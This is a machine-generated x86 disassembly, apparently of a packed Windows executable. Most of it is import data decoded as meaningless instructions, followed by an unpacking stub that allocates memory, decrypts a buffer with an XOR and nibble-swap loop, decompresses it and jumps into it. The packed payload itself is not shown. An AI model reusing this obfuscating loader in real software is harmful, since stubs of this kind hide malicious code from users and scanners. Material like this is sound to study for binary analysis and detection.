_start
add eax 0x0
add ebx 0x0
pushad
nop
nop
je rwxdata
nop
jne rwxdata
call sub_417401
xor [ eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ eax + 0x1 ] dh
add [ eax - 0x59fffe90 ] al
jo rwxdata
nop
jne rwxdata
nop
jmp rwxdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jae rwxdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x70a60001 ] dl
add [ eax ] eax
nop
je rwxdata
cmpsb [ esi ] [ edi ]
jo rwxdata
jo rwxdata
add [ esi - 0x6dfffe90 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esi eax
jo rwxdata
add [ eax ] al
xchg edx eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6dfffe90 ] dl
add [ edx + 0x170 ] dl
jo rwxdata
xchg edx eax
add [ edx - 0x5dfffe90 ] dl
jae rwxdata
mov [ 0x173 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x5dfffe8d ] ah
jae rwxdata
add [ edx + 0x173 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
jae rwxdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ebp
pop ecx
dec ebp
push ebx
push esi
inc ebx
push edx
push esp
insb
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ebp
pop ecx
inc ecx
inc esp
push esi
inc ecx
push eax
dec ecx
xor esi [ edx ]
insb
insb
add [ eax ] al
xor dh [ ecx + 0x1 ]
add [ ecx + esi * 2 + 0x1 ] al
add [ eax + 0x71 ] bl
add [ eax ] eax
push 0x7b000171
jno ExitProcess@IAT
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x59 ] cl
mov [ 0x173 ] al
add [ edx + 0x173 ] ah
mov [ ecx + 0x1 ] esi
add [ eax - 0x53fffe8f ] bl
add [ ecx - 0x67fffe8f ] cl
jno GetCurrentProcess@IAT
shl [ ecx + 0x1 ] 0x0
add cl al
jno __import_lookup_table_1(KERNEL32:GetModuleFileNameA)
jno __import_lookup_table_1(KERNEL32:UnhandledExceptionFilter)
lodsb [ esi ]
fnsave [ ecx + 0x1 ]
add [ ecx + esi * 2 + 0x71c10001 ] ch
add [ eax ] eax
push cs
jb __import_lookup_table_1(KERNEL32:WideCharToMultiByte)
add [ esi ] cl
add ch bl
jno FreeEnvironmentStringsA@IAT
sub [ edx + 0x1 ] esi
add [ ecx ] ch
jb GetEnvironmentStringsA@IAT
jno __import_lookup_table_1(KERNEL32:FreeEnvironmentStringsW)
add bl dh
jno __import_lookup_table_1(KERNEL32:FreeEnvironmentStringsW)
je rwxdata
add [ edx + esi * 2 + 0x1 ] dh
add [ esi - 0x69fffe8e ] al
jb HeapDestroy@IAT
inc eax
jb __import_lookup_table_1(KERNEL32:GetEnvironmentStringsW)
add [ eax + 0x72 ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
dec esp
outsd
popad
dec esp
imul esp [ edx + 0x72 ] 0x41797261
add [ eax ] al
add [ eax ] al
inc edi
je __export_name_ptr_table_1(KERNEL32:UnhandledExceptionFilter)
add [ eax ] eax
xchg [ edx + 0x1 ] dh
add [ esi - 0x5afffe8e ] dl
jb HeapCreate@IAT
movsd [ edi ] [ esi ]
add [ ebp - 0x4bfffe8e ] ah
jb __import_lookup_table_1(KERNEL32:VirtualFree)
pop edx
jb SetHandleCount@IAT
add [ edx + 0x72 ] bl
add [ eax ] eax
add [ eax ] al
push ebp
outsb
je rwxdata
mov ah 0x72
add [ eax ] eax
add [ edx + esi * 2 + 0x72c20001 ] dh
add [ eax ] eax
retn 0x172
add dl al
jb HeapFree@IAT
jb __import_name_1(KERNEL32:GetStdHandle)
jo rwxdata
je rwxdata
jb rwxdata
0xf7000172 0x172
add dl ch
jb __import_lookup_table_1(KERNEL32:GetCPInfo)
shl [ edx + 0x1 ] 0x1
add cl dl
jb RtlUnwind@IAT
inc edi
outsd
outsb
jbe rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
je rwxdata
outsd
outsb
inc esi
imul ebp [ esp + esi * 2 + 0x65 ] 0x72
insb
jne rwxdata
div [ edx + 0x1 ]
add bh dh
jb __import_lookup_table_1(KERNEL32:GetACP)
fnsave [ edx + 0x1 ]
add ch bl
jb WriteFile@IAT
push edx
je rwxdata
je rwxdata
add [ eax ] al
add [ eax + 0x65 ] cl
popad
je rwxdata
add [ eax ] al
add [ eax ] al
dec eax
popad
jb rwxdata
add [ edi + 0x65 ] al
je rwxdata
add [ eax ] al
jo rwxdata
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
push 0x6f547261
outsd
je __export_name_ptr_table_1(KERNEL32:HeapDestroy)
inc ebp
jne rwxdata
dec ecx
outsb
outsw
inc ecx
add [ eax ] al
add [ eax ] al
inc edi
je rwxdata
sbb dh [ ebx + 0x1 ]
add [ edx ] bl
jae __import_lookup_table_1(KERNEL32:HeapReAlloc)
add [ eax ] eax
push cs
jae __import_lookup_table_1(KERNEL32:VirtualAlloc)
add al 0x73
add [ ebx + esi * 2 ] al
add [ eax ] al
push ebp
outsb
ja rwxdata
imul ebp [ ebp ] 0x47000000
je rwxdata
dec eax
popad
outsb
insb
add [ gs : eax ] al
inc esi
jae rwxdata
inc edx
jns rwxdata
dec ecx
outsb
outsw
add [ eax ] al
add [ eax ] al
inc edi
je rwxdata
jb rwxdata
inc ebx
outsb
insd
push ebx
imul ebp [ esi + 0x67 ] 0x4173
inc esi
imul ebp [ ebp + 0x4e ] 0x41656d61
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
popad
outsb
jbe rwxdata
insd
outsb
je rwxdata
jb rwxdata
insb
je rwxdata
jb rwxdata
cmp [ ebx + 0x1 ] esi
add [ ecx ] bh
jae __import_lookup_table_1(KERNEL32:LCMapStringA)
sub dh [ ebx + 0x1 ]
add [ edx ] ch
jae __import_lookup_table_1(KERNEL32:MultiByteToWideChar)
push edx
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul eax [ bx + si ] 0x0
je rwxdata
popad
add [ eax ] al
add [ ebx + eax * 2 + 0x4d ] cl
outsb
add [ fs : eax ] al
add [ eax ] al
push edi
jb rwxdata
inc edx
jns rwxdata
push eax
imul ebp [ ebp + 0x54 ] 0x657079
inc ecx
jb rwxdata
jns rwxdata
add [ eax ] al
inc edi
je rwxdata
add [ gs : eax ] al
add [ eax ] al
dec esp
inc ebx
dec ebp
push 0x7261
inc ebx
push eax
add [ eax ] al
add [ eax ] al
inc edi
je rwxdata
insb
popad
je rwxdata
jb rwxdata
jb rwxdata
je rwxdata
je __import_name_1(KERNEL32:RtlUnwind)
outsb
jae rwxdata
outsb
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
jb rwxdata
outsb
jbe rwxdata
inc ebp
imul ebp [ edi + 0x6e ] 0x0
inc ebp
js rwxdata
jo rwxdata
add [ eax + 0x73 ] dh
push eax
jae __import_lookup_table_1(KERNEL32:LCMapStringW)
add [ eax + 0x73 ] dl
add [ eax ] eax
add eax [ eax ]
add [ eax - 0x77 ] dl
test ebp edi
add eax [ eax ]
add [ ebx + 0x3c09d ] cl
add [ ebx ] al
fst [ ebx - 0x1 ]
mov ch 0xe0
add eax [ eax ]
add al ch
or eax [ eax ]
add [ eax ] al
jne rwxdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x41
add [ ebx + eax * 2 + 0x4d ] cl
je rwxdata
pop ss
adc [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
push esp
outsd
add [ edi + 0x65 ] al
je rwxdata
inc ecx
jne rwxdata
jo rwxdata
add [ eax ] al
add [ eax + 0x65 ] cl
popad
popad
jo rwxdata
inc ebx
dec ebp
insb
inc ebp
dec ebp
inc ebx
push eax
add [ eax ] al
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x416c6175
insb
outsd
arpl [ eax ] ax
add [ eax ] al
add [ eax + 0x65 ] cl
popad
jo rwxdata
add [ eax ] al
imul esi [ edx + 0x74 ] 0x466c6175
insb
insb
outsd
arpl [ eax ] ax
add [ eax ] al
add [ ebp + 0x75 ] cl
insb
je rwxdata
add [ gs : eax ] al
add [ eax ] al
dec eax
popad
jo rwxdata
outsb
imul ebp [ esi + 0x67 ] 0x5773
popad
insb
inc esi
add [ eax ] al
push ebx
je __export_name_ptr_table_1(KERNEL32:VirtualFree)
add [ eax ] al
add [ eax ] al
inc edi
add [ eax ] al
je rwxdata
je rwxdata
jb rwxdata
add [ eax ] eax
xor [ ebx + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edi
je rwxdata
add [ eax ] al
add [ ebp + 0x78 ] al
imul esi [ eax + edx * 2 + 0x72 ] 0x7365636f
jb rwxdata
pushad
jae __import_lookup_table_1(KERNEL32:GetStringTypeA)
add [ eax + 0x73 ] ah
add [ eax ] eax
push eax
push ebx
call sub_4174ac
pop edx
push ebp
jmp edx
add al 0x68
add [ eax ] dl
add [ eax ] al
push [ ebp + 0x3c4 ]
push 0x0
call [ ebp + 0x3f1 ]
push eax
mov [ ebp + 0x3fd ] eax
mov ebx [ ebp + 0x3c0 ]
add ebx ebp
push ebx
push [ ebp + 0x3e0 ]
call sub_417485
insb
insb
outsd
arpl [ eax ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
inc ecx
add [ eax ] al
add [ eax ] al
add [ edi + 0x6b ] ah
add [ eax ] al
je rwxdata
jo rwxdata
inc esi
add [ eax ] al
add [ eax ] al
add bh bh
or [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
push ebx
inc ebp
jb __import_dll_name(KERNEL32)
jb rwxdata
add [ eax ] al
push esi
popad
outsb
insb
inc ebx
outsd
dec eax
imul ebp [ esi + 0x67 ] 0x4173
je rwxdata
jb rwxdata
add [ eax ] al
inc esi
jb rwxdata
inc ecx
imul ebp [ esi + 0x61 ] 0x72506574
add [ eax ] al
add [ ebp + 0x72 ] dl
insd
jae rwxdata
arpl [ ecx + 0x64 ] ax
jb rwxdata
add [ eax ] al
add [ eax ] al
dec [ eax ]
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x416c6175
imul ebp [ esi + 0x67 ] 0x57
add [ edi + 0x65 ] al
je rwxdata
add [ eax ] al
add [ eax ] al
add [ ebp - 0x7f ] bl
imul ebp [ esi + 0x67 ] 0x65707954
push edi
add [ eax ] al
dec ebx
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ebp
pop ecx
push ebp
push edi
imul esp [ ebp + 0x43 ] 0x726168
imul eax [ edx + 0x79 ] 0x6f546574
add [ gs : eax ] al
add [ eax ] al
je rwxdata
je __export_name_ptr_table_1(KERNEL32:VirtualFree)
inc ebp
outsb
jbe rwxdata
outsb
je rwxdata
jae rwxdata
arpl [ ebp + 0x73 ] sp
add [ eax ] al
add [ edi + 0x65 ] al
je __import_name_1(KERNEL32:FreeEnvironmentStringsA)
outsd
arpl [ ebp + 0x73 ] sp
jae rwxdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
je __import_name_1(KERNEL32:RtlUnwind)
jne rwxdata
jb rwxdata
inc esi
jb rwxdata
jne rwxdata
outsb
add [ eax ] al
add [ eax ] al
inc edi
je rwxdata
imul ebp [ esi + 0x67 ] 0x65707954
inc ecx
add [ eax ] al
add [ eax ] al
inc edi
je rwxdata
je __import_name_1(KERNEL32:RtlUnwind)
outsb
push edi
add [ eax ] al
jb rwxdata
jae rwxdata
jb rwxdata
outsd
jne rwxdata
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insd
outsb
je rwxdata
je rwxdata
outsb
outsb
je rwxdata
add [ eax ] al
add [ edi + 0x69 ] dl
inc ebx
arpl [ ebp + 0x73 ] sp
jae rwxdata
outsd
dec eax
popad
outsb
insb
inc ecx
add [ eax ] al
inc edi
je rwxdata
add [ eax ] al
add [ eax ] al
push edi
imul esp [ ebp + 0x43 ] 0x54726168
imul ebp [ esi + 0x67 ] 0x5773
push 0x6c646e61
inc ebp
js rwxdata
add [ eax ] al
add [ ebp + 0x6e ] dl
sub_417401
pop ebp
add ebp 0xffffffe4
mov eax [ ebp + 0x3f9 ]
or eax eax
je rwxdata
inc [ ebp + 0x3f9 ]
mov eax [ esp + 0x24 ]
mov [ ebp + 0x3f5 ] eax
lea esi [ ebp + 0x394 ]
push esi
call [ ebp + 0xaa ]
lea esi [ ebp + 0x3e4 ]
push esi
push eax
call [ ebp + 0xa6 ]
mov [ ebp + 0x3f1 ] eax
push 0x4
push 0x1000
push [ ebp + 0x3c4 ]
push 0x0
call [ ebp + 0x3f1 ]
push eax
mov [ ebp + 0x3fd ] eax
mov ebx [ ebp + 0x3c0 ]
add ebx ebp
push ebx
push [ ebp + 0x3e0 ]
call sub_417485
push eax
push ebx
call sub_4174ac
pop edx
push ebp
jmp edx
push ebp
jmp [ ebp + 0x3fd ]
sub_417485
pushad
mov ecx [ esp + 0x24 ]
mov esi [ esp + 0x28 ]
mov ah 0x0
mov al [ esi ]
sub al ah
xor al 0x25
mov dl al
shl al 0x4
shr dl 0x4
add dl al
mov [ esi ] dl
inc esi
inc ah
dec ecx
jne rwxdata
popad
retn 0x8
sub_4174ac
pushad
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
cld
mov dl 0x80
xor ebx ebx
movsb [ edi ] [ esi ]
mov bl 0x2
xor ecx ecx
call sub_41754f
nop
jae rwxdata
nop
call sub_41755e
nop
sub ecx ebx
nop
jne rwxdata
nop
xor eax eax
nop
call sub_41754f
nop
jae rwxdata
nop
xchg ecx eax
dec eax
shl eax 0x8
lodsb [ esi ]
nop
call sub_41755b
nop
cmp eax 0x7d00
jae rwxdata
call sub_41755b
nop
jmp rwxdata
nop
lodsb [ esi ]
nop
shr eax 0x1
nop
je rwxdata
nop
mov bl 0x2
nop
inc ecx
mov al 0x10
nop
inc ecx
nop
cmp ah 0x5
jae rwxdata
mov eax ebp
nop
mov bl 0x1
sub edi [ esp + 0x28 ]
nop
mov [ esp + 0x1c ] edi
popad
retn 0x8
nop
adc ecx ecx
nop
jmp rwxdata
nop
call sub_41754f
nop
adc al al
nop
jae rwxdata
nop
jne rwxdata
call sub_41754f
jae rwxdata
nop
inc ecx
cmp eax 0x7f
ja rwxdata
nop
push esi
mov esi edi
sub esi eax
[ edi ] [ esi ]
pop esi
nop
jmp rwxdata
stosb [ edi ]
jmp rwxdata
nop
xchg ebp eax
sub_41754f
add dl dl
jne rwxdata
retn
nop
mov dl [ esi ]
inc esi
adc dl dl
nop
sub_41755b
nop
xor ecx ecx
sub_41755e
inc ecx
call sub_41754f
adc ecx ecx
call sub_41754f
jb rwxdata
retn
